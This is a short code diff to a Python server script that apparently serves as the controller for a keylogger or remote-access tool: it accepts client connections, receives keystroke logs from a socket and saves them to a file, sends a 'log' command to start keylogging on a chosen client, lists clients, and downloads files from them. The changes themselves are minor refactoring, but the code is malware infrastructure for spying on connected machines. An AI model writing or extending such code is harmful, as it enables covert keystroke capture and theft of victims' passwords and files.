@@ -4,7 +4,6 @@ import time
 import threading
 import sys
 
-
 def newConn(c, addr):
 	while(True):
 		try:
@@ -15,7 +14,6 @@ def newConn(c, addr):
 			sys.stdout.write(str(ip) +"/"+ hostname + " has disconnected...\n>")
 			sys.stdout.flush()
 			return;
-
 
 def getIP():
 	s = socket.socket()
@@ -86,12 +84,10 @@ def recvKeyLogs(socket):
 		key = socket.recv(512)
 		f.write(key)
 		print(key[0][0])
-		
-	
 
-def whatDo(cmd):
-	socket = findSocketById(cmd[0])
-	if("log" in cmd):
+def whatDo(iD, cmd):
+	socket = findSocketById(iD)
+	if(cmd == "log"):
 		keyLog(socket)
 	elif("list" in cmd):
 		printClients()
@@ -116,8 +112,6 @@ def downloadFile(socket):
 		print(line)
 		f.write(line)
 		
-
-
 def main():
 	t = threading.Thread(target=waitForConns)
 	t.setDaemon(True)
